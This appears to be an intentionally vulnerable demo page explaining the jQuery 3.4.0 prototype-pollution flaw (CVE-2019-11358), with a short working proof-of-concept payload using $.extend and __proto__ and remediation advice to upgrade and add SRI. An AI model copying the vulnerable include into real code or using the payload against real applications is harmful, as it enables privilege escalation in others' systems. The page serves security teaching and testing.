Vulnerable JavaScript Library

CVE-2019-11358 High

This page intentionally loads jQuery 3.4.0 — a version known to be vulnerable to Prototype Pollution via $.extend(). An attacker who can control the data passed to $.extend(true, …) can inject properties into Object.prototype, affecting every object in the JavaScript runtime and enabling privilege escalation, denial of service, or remote code execution in some environments.

Vulnerable HTML Include

The library is included in the page HTML with no integrity check (no integrity / crossorigin SRI attributes):

<script src="/assets/js/jquery-3.4.0.js"></script>

⚠️ No Subresource Integrity (SRI) hash — if the file were compromised, the browser would load it silently. The fixed version is jQuery 3.4.1.

Live Exploit — Prototype Pollution via $.extend()
// Attacker-controlled JSON payload containing __proto__ const payload = JSON.parse('{"__proto__": {"isAdmin": true, "polluted": "YES — prototype polluted!"}}'); // $.extend(true, ...) in jQuery 3.4.0 does NOT sanitise __proto__ $.extend(true, {}, payload); // Now EVERY plain object inherits the injected property const victim = {}; console.log(victim.isAdmin); // → true (should be undefined) console.log(victim.polluted); // → "YES — prototype polluted!"
Remediation
// ✗ VULNERABLE — jQuery 3.4.0 (and below) <script src="/assets/js/jquery-3.4.0.js"></script> // ✓ FIXED — Upgrade to 3.4.1+ and add SRI hash <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script> // Or avoid jQuery altogether and use the Fetch API / vanilla JS
